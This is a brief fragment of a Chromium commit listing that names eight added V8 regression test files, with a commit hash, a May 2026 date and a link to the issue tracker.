- A `test/mjsunit/regress/regress-450328966.js`
- A `test/mjsunit/regress/regress-452296415.js`
- A `test/mjsunit/regress/regress-469143679.js`
- A `test/mjsunit/regress/regress-476233066-1.js`
- A `test/mjsunit/regress/regress-476233066-2.js`
- A `test/mjsunit/regress/regress-478659010.js`
- A `test/mjsunit/regress/regress-485267831.js`
- A `test/mjsunit/regress/regress-508811477.js`

---

Hash: [a5d1a1cc6911f1d1c7f30da136c8f252b05a58dc](https://chromiumdash.appspot.com/commit/a5d1a1cc6911f1d1c7f30da136c8f252b05a58dc)  

Date: Fri May 29 12:59:59 2026


---

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/383647255)*
